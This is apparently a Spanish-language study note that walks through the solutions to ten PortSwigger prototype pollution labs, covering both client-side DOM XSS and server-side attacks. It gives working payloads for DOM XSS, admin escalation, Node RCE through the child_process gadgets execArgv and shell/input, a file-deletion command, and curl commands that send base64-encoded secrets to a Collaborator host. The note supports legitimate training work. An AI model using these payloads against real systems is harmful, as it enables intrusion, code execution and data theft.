---
aliases:
  - Prototype pollution labs
  - proto-pollution-labs
tags:
  - vuln/prototype-pollution
  - labs
  - portswigger
---

# Prototype pollution — Labs de PortSwigger

> 🔎 Metodología (sources URL/JSON, gadgets, sinks, `__proto__` vs `constructor`, overrides de detección, RCE) → [[vulnerabilities/020-prototype-pollution/prototype-pollution|entry point de Prototype Pollution]].

Labs de la categoría **[Prototype pollution](https://portswigger.net/web-security/prototype-pollution)**: **9 Practitioner + 1 Expert** (10 en total), partidas en **client-side** (5) y **server-side** (5). **El hilo común:** contaminás `Object.prototype` metiendo una propiedad por una **source** (`__proto__[x]`, `__proto__.x` o `constructor.prototype.x`); esa propiedad la **hereda todo objeto** de la app, y si en algún lado hay un **gadget** (una propiedad que la app lee sin haberla definido) que llega a un **sink**, la explotás. Lo que cambia lab a lab: **dónde está la source** (query string, fragmento, JSON del body), **qué gadget** hay (`transport_url`, `sequence`, `isAdmin`, `execArgv`, `shell`) y **a qué sink** llega (DOM XSS del lado cliente; escalada de privilegios o RCE del lado servidor).

> [!note] Los dos mundos (la clave de toda la categoría)
> - **Client-side** — la source está en la **URL** (query o `#` fragmento). El sink es del navegador → **DOM XSS**. El gadget típico crea un `<script src=...>` (`transport_url`, `value`) o llega a `eval`/`setTimeout` (`sequence`, `hitCallback`). Objetivo: `alert()`. Labs 1-5.
> - **Server-side** — la source es el **JSON del body** (`POST /my-account/change-address`). No ves el código, así que **detectás a ciegas** (reflexión de la propiedad, o overrides no destructivos: `status`, `json spaces`, `charset`). Gadgets: `isAdmin` (escalada) o `execArgv`/`shell` de `child_process` (**RCE**). Labs 6-10.

> [!tip] Dos formas de escribir la source (memorizá esto)
> - **`__proto__`** — la vía directa: `__proto__[foo]=bar` (bracket) o `__proto__.foo=bar` (punto), y en JSON `"__proto__":{"foo":"bar"}`.
> - **`constructor.prototype`** — la vía alternativa cuando **filtran `__proto__`**: `"constructor":{"prototype":{"foo":"bar"}}`. Llega al mismo `Object.prototype`.
> - **Confirmar que contaminaste:** inyectás una propiedad basura (`foo:bar`) y comprobás que **cualquier otro objeto** ahora la tiene (aparece en la respuesta, o `Object.prototype.foo` en consola).

> **Herramientas:** Burp Repeater (server-side, editar el JSON) + **DOM Invader** con la opción *prototype pollution* activada (client-side: encuentra sources y hace "Scan for gadgets") + **Burp Collaborator** (confirmar RCE / exfiltración). **Cómo leer las columnas:** **Nivel** = dificultad PortSwigger · **Técnica · qué necesitás** = source + gadget + sink · **Objetivo** = qué conseguís. Payloads → [Solución por lab](#solución-por-lab).

## Client-side (DOM XSS)

| #   | Laboratorio                                                                                                                                                                       | Nivel            | Técnica · qué necesitás                                                                                                                                                                                                 | Objetivo                                                                                    |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| 1   | [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution) | **Practitioner** | **Source en query (bracket) + gadget `transport_url`.** `searchLogger.js` hace `if(config.transport_url){script.src=...}`. Confirmás con `__proto__[foo]=bar` y explotás con `__proto__[transport_url]=data:,alert(1);`. | Ejecutar `alert()` (XSS auto-disparado al cargar la URL).                                    |
| 2   | [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector) | **Practitioner** | **Source con notación de punto + gadget `sequence`.** El bracket no anda; usás `__proto__.sequence=...`. `searchLoggerAlternative.js` mete `manager.sequence` en un sink tipo `eval`.                                    | Ejecutar `alert()`.                                                                          |
| 3   | [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization) | **Practitioner** | **Bypass de sanitización no recursiva.** La app borra `__proto__` **una sola vez**. Anidás la cadena: `__pro__proto__to__[...]` → tras el filtro queda `__proto__`. Gadget `transport_url`.                              | Ejecutar `alert()`.                                                                          |
| 4   | [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis) | **Practitioner** | **Gadget vía browser API (`Object.defineProperty`/`fetch`).** `searchLoggerConfigurable.js` lee `config.value`. Payload `__proto__[value]=data:,alert(1);`.                                                              | Ejecutar `alert()`.                                                                          |
| 5   | [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries) | **Practitioner** | **Source en el `#` fragmento + gadget `hitCallback` → `setTimeout()`.** Lo hallás con **DOM Invader** ("Scan for gadgets"). Entregás vía exploit server un `location=...#__proto__[hitCallback]=alert(document.cookie)`. | **Entregar a la víctima** un exploit que dispare `alert(document.cookie)`.                   |

## Server-side (escalada / RCE)

| #   | Laboratorio                                                                                                                                                                    | Nivel            | Técnica · qué necesitás                                                                                                                                                                                                                             | Objetivo                                                                        |
| --- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| 6   | [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution) | **Practitioner** | **Source reflejada + gadget `isAdmin`.** En `POST /my-account/change-address` (JSON) agregás `"__proto__":{"foo":"bar"}` y ves `foo` en la respuesta = contaminaste. Después `"__proto__":{"isAdmin":true}`.                                          | Escalar a **admin** y **borrar al usuario `carlos`**.                            |
| 7   | [Detecting server-side PP without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection) | **Practitioner** | **Detección no destructiva (sin reflexión).** No se refleja `foo`. Usás **status override** (`"__proto__":{"status":400,"statusCode":400}` → el error expone 400), o `json spaces`, o `charset`. Confirmás y escalás con `isAdmin`.                    | Confirmar la vuln sin romper nada → **admin** → borrar `carlos`.                 |
| 8   | [Bypassing flawed input filters for server-side PP](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution) | **Practitioner** | **Bypass vía `constructor`.** Filtran la clave `__proto__`. Detectás con `"constructor":{"prototype":{"json spaces":10}}` (cambia la indentación) y explotás con `"constructor":{"prototype":{"isAdmin":true}}`.                                       | Escalar a **admin** y borrar `carlos`.                                           |
| 9   | [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution) | **Practitioner** | **Gadget `execArgv` de `child_process.fork()`.** Detectás con `json spaces`; el admin corre "maintenance jobs" que forkea Node. Inyectás `"__proto__":{"execArgv":["--eval=require('child_process').execSync('...')"]}` y disparás el job.            | **RCE**: borrar `/home/carlos/morale.txt`.                                       |
| 10  | [Exfiltrating sensitive data via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution) | **Expert**       | **Gadget `shell`+`input` de `child_process.execSync()`.** Igual detección; usás `"__proto__":{"shell":"vim","input":":! cat /home/carlos/secret \| base64 \| curl -d @- https://COLLAB\n"}` y recibís el secret en **Collaborator**.                 | **Exfiltrar** `/home/carlos/secret` y enviarlo.                                  |

---

## Solución por lab

**L1 — DOM XSS via client-side PP (gadget `transport_url`):**
```
/?__proto__[foo]=bar            → confirmá: en consola, Object.prototype.foo == "bar"
/?__proto__[transport_url]=data:,alert(1);
```
> Al cargar la URL, `searchLogger.js` crea `<script src="data:,alert(1)">` y dispara el XSS.

**L2 — Vector alternativo (notación de punto, gadget `sequence`):**
```
/?__proto__.foo=bar             → confirmá
/?__proto__.sequence=alert(1)-
```
> El bracket `__proto__[...]` no funciona acá; sí la notación con punto. El `-` final cierra la expresión que va al sink.

**L3 — Flawed sanitization (filtro no recursivo):**
```
/?__pro__proto__to__[transport_url]=data:,alert(1);
```
> La app elimina la subcadena `__proto__` una vez. Al quitar el `__proto__` del medio, lo que queda vuelve a formar `__proto__`. Gadget `transport_url` como en L1.

**L4 — Browser APIs (gadget `value`):**
```
/?__proto__[value]=data:,alert(1);
```
> `searchLoggerConfigurable.js` usa una browser API que lee `config.value`; al contaminarlo, termina en `script.src`.

**L5 — Third-party libraries (DOM Invader + exploit server):**
1. Cargá el lab en el navegador de Burp, activá **DOM Invader** con la opción *prototype pollution*.
2. Recargá → DOM Invader detecta 2 vectores en el `hash`. Click **Scan for gadgets** → encuentra `hitCallback` (llega a `setTimeout()`) → **Exploit** genera el PoC (`alert(1)`).
3. En el **exploit server**, entregás a la víctima:
   ```html
   <script>
     location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
   </script>
   ```
4. Probalo con vos, después **Deliver to victim**.

**L6 — Privilege escalation (source reflejada, gadget `isAdmin`):**
> En `POST /my-account/change-address`, sobre el JSON:
```json
{ "...": "...", "__proto__": { "foo": "bar" } }   // confirmá: "foo" aparece en la respuesta
{ "...": "...", "__proto__": { "isAdmin": true } } // isAdmin pasa a true
```
> Refrescá → aparece el link al **admin panel** → **borrá a `carlos`**.

**L7 — Detección sin reflexión (status override):**
1. `"__proto__":{"foo":"bar"}` → **no** se refleja (no significa que sea inmune).
2. Rompé la sintaxis del JSON (borrá una coma) → error 500 cuyo body trae `"status":400`.
3. Contaminá ese comportamiento:
   ```json
   "__proto__": { "status": 400, "statusCode": 400 }
   ```
   Un cambio observable de status/charset/indentación confirma la contaminación. (Alternativas: `json spaces`, `content-type` con `charset`.)
4. Escalá con `"__proto__":{"isAdmin":true}` → admin → borrá `carlos`.

**L8 — Bypass de filtro (vía `constructor`):**
```json
"constructor": { "prototype": { "json spaces": 10 } }   // detección: cambia la indentación del raw
"constructor": { "prototype": { "isAdmin": true } }     // escalada
```
> `__proto__` está filtrado; `constructor.prototype` llega al mismo `Object.prototype`. Luego admin → borrar `carlos`.

**L9 — RCE (gadget `execArgv` de `child_process.fork()`):**
1. Detectá: `"__proto__":{"json spaces":10}` cambia la indentación.
2. El admin panel tiene "run maintenance jobs" (forkea procesos Node). Inyectá:
   ```json
   "__proto__": {
     "execArgv": [
       "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
     ]
   }
   ```
3. Corré el maintenance job (o esperá que se dispare) → se ejecuta el comando.
   > Verificá primero con Collaborator: `--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')`.

**L10 — Exfiltración (gadget `shell`+`input` de `execSync()`):**
1. Detectá con `"__proto__":{"json spaces":10}`.
2. Los maintenance jobs usan `child_process.execSync()`. Abusás de `shell:"vim"` + `input` (comando `:!` de vim):
   ```json
   "__proto__": {
     "shell": "vim",
     "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
   }
   ```
3. Disparás el job, mirás **Collaborator**, decodificás base64 → obtenés el `secret` y lo enviás para resolver.
   > Podés reconocer el terreno primero con `ls /home/carlos | base64 | curl -d @- ...`.

---

## Atajos mentales / patrones

- **Source → gadget → sink:** contaminás `Object.prototype` (source), la app lee una propiedad que nunca definió (gadget), y esa propiedad viaja a algo peligroso (sink). Sin gadget que llegue a un sink, la contaminación es inofensiva.
- **Client-side = URL + DOM XSS.** Probá siempre `?__proto__[foo]=bar`, `?__proto__.foo=bar` y en el `#` fragmento. Confirmás en consola con `Object.prototype.foo`. Gadgets clásicos: `transport_url`, `value` (→ `script.src`), `sequence`, `hitCallback` (→ `eval`/`setTimeout`). **DOM Invader** hace todo el trabajo pesado.
- **Server-side = JSON del body + a ciegas.** No ves el código. Si la propiedad basura **se refleja**, listo; si **no**, usás overrides no destructivos: **`status`/`statusCode`** (cambia el código de error), **`json spaces`** (cambia la indentación del raw), **`content-type`/charset**. Nunca rompas el server de entrada.
- **Si filtran `__proto__` → `constructor.prototype`.** Es la vía alternativa a `Object.prototype`. Y si el filtro es **no recursivo**, anidá la cadena (`__pro__proto__to__`).
- **Escalada de privilegios:** el gadget estrella es `isAdmin:true`. Después: admin panel → borrar `carlos`.
- **RCE en Node:** abusás de opciones de `child_process`. `fork()` → gadget **`execArgv`** con `--eval=...`. `execSync()`/`spawn()` → gadgets **`shell`+`input`** (`vim`, `node`) o **`NODE_OPTIONS`**. Siempre confirmá primero con un `curl` a **Collaborator** antes de comandos destructivos.
- **El disparo es asíncrono:** en varios server-side, el sink solo corre cuando un **admin** ejecuta cierta funcionalidad (maintenance jobs). Contaminás y **después** disparás.

> [!note] Ver también
> - **Entry point de la categoría** (payloads de RCE, overrides, soluciones defensivas) → [[vulnerabilities/020-prototype-pollution/prototype-pollution|prototype pollution]].
> - **DOM-based XSS** (mismos sinks del lado cliente, `alert()` como objetivo) → [[vulnerabilities/025-dom-based/dom-based|DOM-based XSS]].
> - **Insecure deserialization** (misma idea de "gadget chain" hasta RCE, otro mecanismo) → [[vulnerabilities/013-insecure_deserialization/insecure-deserialization|insecure deserialization]].
> - **Access control** (escalada a admin → borrar usuario, mismo objetivo final) → [[vulnerabilities/028-access-control/access-control|access control]].
